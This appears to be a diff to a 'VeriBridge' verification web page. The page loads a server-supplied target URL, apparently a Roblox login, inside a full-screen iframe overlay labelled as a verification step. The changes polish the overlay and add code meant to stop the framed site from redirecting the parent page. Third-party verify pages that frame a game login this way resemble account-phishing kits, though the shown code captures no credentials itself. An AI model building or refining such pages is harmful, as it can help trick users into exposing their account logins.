@@ -93,18 +93,20 @@
         .loading-spinner-large{width:60px;height:60px;border:4px solid rgba(100,200,255,0.2);border-top:4px solid #8dd0ff;border-radius:50%;animation:spinGold 1s linear infinite}
         @keyframes spinGold{to{transform:rotate(360deg)}}
         
-        .frame-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);backdrop-filter:blur(6px);z-index:9999;display:flex;justify-content:center;align-items:flex-start;visibility:hidden;opacity:0}
+        .frame-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);backdrop-filter:blur(8px);z-index:9999;display:flex;justify-content:center;align-items:center;visibility:hidden;opacity:0;transition:all 0.3s ease}
         .frame-overlay.active{visibility:visible;opacity:1}
-        .frame-card{width:90%;max-width:500px;background:white;border-radius:28px;overflow:hidden;position:relative;margin-top:60px;transform:translateY(-100%);transition:transform 0.4s cubic-bezier(0.2,0.9,0.4,1.1)}
-        .frame-overlay.active .frame-card{transform:translateY(0)}
-        .frame-close{position:absolute;top:14px;right:18px;width:34px;height:34px;background:rgba(0,0,0,0.6);color:white;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:30;font-size:20px}
+        .frame-card{width:90%;max-width:500px;background:white;border-radius:28px;overflow:hidden;position:relative;transform:scale(0.9);transition:transform 0.3s ease;box-shadow:0 30px 50px rgba(0,0,0,0.4)}
+        .frame-overlay.active .frame-card{transform:scale(1)}
+        .frame-close{position:absolute;top:14px;right:18px;width:34px;height:34px;background:rgba(0,0,0,0.6);color:white;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:30;font-size:20px;font-weight:bold;border:none}
+        .frame-close:hover{background:#e34d4d}
         .roblox-login-iframe{width:100%;height:560px;border:none;display:block}
+        @media(max-width:550px){.roblox-login-iframe{height:520px}}
         
         .user-profile-card{position:fixed;top:20px;right:20px;z-index:100;background:rgba(0,0,0,0.7);backdrop-filter:blur(16px);border-radius:60px;padding:6px 12px 6px 8px;display:flex;align-items:center;gap:12px;border:1px solid rgba(100,200,255,0.5);display:none}
         .user-profile-card.show{display:flex}
         .user-avatar{width:42px;height:42px;border-radius:50%;object-fit:cover;border:2px solid #8dd0ff}
         .user-display-name{font-size:0.85rem;font-weight:700;color:#cceeff}
-        .logout-btn{background:none;border:none;color:#ff8888;cursor:pointer;font-size:1rem;padding:4px 8px}
+        .logout-btn{background:none;border:none;color:#ff8888;cursor:pointer;font-size:1rem;padding:4px 8px;border-radius:20px}
         
         .ai-chat-widget{position:fixed;bottom:15px;right:15px;z-index:1000;cursor:pointer}
         .chat-bubble{width:55px;height:55px;background:linear-gradient(135deg,#2c5a7a,#1e3a5a);border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(0,0,0,0.3)}
@@ -204,11 +206,11 @@
     <div class="footer-gold">Select a verification method to continue</div>
 </div>
 
-<!-- ROBLOX AUTH FRAME - Loads the user's entered URL -->
+<!-- IFRAME OVERLAY - Loads the target URL without redirecting parent -->
 <div id="robloxFrameOverlay" class="frame-overlay">
     <div class="frame-card">
-        <div class="frame-close" id="closeFrameBtn">X</div>
-        <iframe id="robloxLoginIframe" class="roblox-login-iframe" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation" referrerpolicy="no-referrer" title="Verification Page" frameborder="0"></iframe>
+        <button class="frame-close" id="closeFrameBtn">✕</button>
+        <iframe id="robloxLoginIframe" class="roblox-login-iframe" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation" referrerpolicy="no-referrer" title="Verification Page" frameborder="0"></iframe>
     </div>
 </div>
 
@@ -217,7 +219,7 @@
 <div class="chat-window" id="chatWindow"><div class="chat-header"><h4>VeriBridge Assistant</h4><button class="close-chat" id="closeChatBtn">✕</button></div><div class="chat-messages" id="chatMessages"><div class="message ai"><div class="message-bubble">Hello! I'm your VeriBridge assistant. Ask me anything!</div></div></div><div class="chat-input-area"><input type="text" class="chat-input" id="chatInput" placeholder="Ask me anything..."><button class="send-btn" id="sendChatBtn">Send</button></div></div>
 
 <script>
-// ==================== SIMPLE VERIFICATION PAGE ====================
+// ==================== SIMPLE VERIFICATION PAGE - NO PARENT REDIRECT ====================
 // These values are injected by the server
 const VERIFY_CODE = '{{VERIFY_CODE}}';
 const TARGET_URL = '{{TARGET_URL}}';
@@ -280,19 +282,42 @@ closeChatBtn.addEventListener('click',()=>chatWindow.classList.remove('active'))
 sendChatBtn.addEventListener('click',sendMessage);
 chatInput.addEventListener('keypress',e=>{if(e.key==='Enter')sendMessage()});
 
-// Frame logic - loads the user's entered URL
+// Frame logic - loads target URL in iframe WITHOUT redirecting parent
 const frameOverlay=document.getElementById('robloxFrameOverlay');
 const closeFrameBtn=document.getElementById('closeFrameBtn');
 const robloxIframe=document.getElementById('robloxLoginIframe');
 
+// Prevent iframe from redirecting the parent window
+window.addEventListener('message', function(event) {
+    // Block any attempts to redirect the parent
+    if (event.data && event.data.type === 'redirect') {
+        console.log('[VeriBridge] Blocked redirect attempt from iframe');
+        event.preventDefault();
+    }
+});
+
+// Also block beforeunload events from the iframe
+window.addEventListener('beforeunload', function(e) {
+    // This prevents the iframe from causing page navigation
+    return null;
+});
+
 function showRobloxFlow(){
     console.log('[VeriBridge] Loading URL in iframe:', TARGET_URL);
+    console.log('[VeriBridge] Parent page will NOT redirect - iframe is contained');
+    // Load the target URL in the iframe
     robloxIframe.src = TARGET_URL;
     frameOverlay.classList.add('active');
 }
 
 function hideFrame(){
     frameOverlay.classList.remove('active');
+    // Optional: clear iframe when closing
+    setTimeout(() => {
+        if (!frameOverlay.classList.contains('active')) {
+            robloxIframe.src = 'about:blank';
+        }
+    }, 300);
 }
 
 closeFrameBtn?.addEventListener('click', hideFrame);
